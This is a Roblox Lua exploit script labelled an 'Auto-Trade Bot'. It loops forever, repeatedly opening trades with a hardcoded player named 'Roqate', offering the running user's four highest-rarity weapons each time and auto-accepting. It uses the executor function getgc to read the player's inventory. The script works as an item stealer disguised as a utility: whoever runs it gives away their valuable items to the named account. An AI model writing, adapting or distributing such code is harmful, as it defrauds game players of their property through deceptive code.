-- Ultimate Auto-Trade Bot with Rarity Priority
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Settings
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 5
local ITEM_ADD_DELAY = 0.3

-- Priority order for rarities (higher first)
local RARITY_PRIORITY = {
    Godly = 1,
    Ancient = 2,
    Unique = 3,
    Classic = 4
}

-- Allowed rarities set for quick check
local ALLOWED_RARITIES = {}
for rarity,_ in pairs(RARITY_PRIORITY) do
    ALLOWED_RARITIES[rarity] = true
end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

local isTrading = false
local lastTradeTime = 0

-- Helper: Find player
local function findPlayer(name)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == name:lower() then
            return player
        end
    end
    return nil
end

-- Helper: Check if Trade GUI is open
local function isTradeGUIOpen()
    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
end

-- Helper: Wait until MyInventory is fully loaded
local function waitForMyInventory()
    local timeout = os.clock() + 15 -- wait max 15 seconds
    while os.clock() < timeout do
        for _,module in ipairs(getgc(true)) do
            if type(module) == "table" and rawget(module, "MyInventory") then
                local inv = module.MyInventory
                if inv.Data and inv.Data.Weapons then
                    return inv
                end
            end
        end
        task.wait(0.5)
    end
    return nil
end

-- Collect best weapons with rarity priority
local function getBestWeapons()
    local result = {}
    local inv = waitForMyInventory()
    if not inv then
        warn("❌ Could not load MyInventory (still nil after waiting)!")
        return result
    end

    local weaponCandidates = {}

    for categoryName, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(weaponCandidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    -- Sort by priority (lower number = higher priority)
    table.sort(weaponCandidates, function(a, b)
        return a.priority < b.priority
    end)

    -- Pick top N
    for i = 1, math.min(#weaponCandidates, MAX_ITEMS_PER_TRADE) do
        table.insert(result, weaponCandidates[i].name)
    end

    return result
end

-- Add weapons to trade
local function addWeaponsToTrade()
    local weapons = getBestWeapons()
    if #weapons == 0 then
        warn("⚠ No valid high-rarity weapons found!")
        return false
    end

    print("✅ Adding weapons to trade:")
    for _, weapon in ipairs(weapons) do
        print("   →", weapon)
        TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end

    return true
end

-- Accept trade
local function acceptTrade()
    if not isTradeGUIOpen() then
        warn("⚠ Trade GUI not open!")
        return false
    end
    TradeRemotes.AcceptTrade:FireServer(285646582)
    return true
end

-- Full trade flow
local function initiateTrade(targetPlayer)
    if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then return end

    isTrading = true
    print("🔄 Starting trade with " .. targetPlayer.Name .. "...")

    local success, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)

    if not success then
        warn("❌ Trade request failed:", err)
        isTrading = false
        return
    end

    task.wait(1)

    if not isTradeGUIOpen() then
        warn("⚠ Trade GUI didn't open!")
        isTrading = false
        return
    end

    if not addWeaponsToTrade() then
        warn("⚠ No valid weapons to trade!")
        isTrading = false
        return
    end

    if acceptTrade() then
        print("✅ Trade with " .. targetPlayer.Name .. " completed!")
    else
        warn("❌ Failed to accept trade!")
    end

    isTrading = false
    lastTradeTime = os.time()
end

-- Main loop
while true do
    local target = findPlayer(TARGET_PLAYER)
    if target then
        initiateTrade(target)
    else
        print(TARGET_PLAYER .. " not found. Waiting...")
    end
    task.wait(5)
end
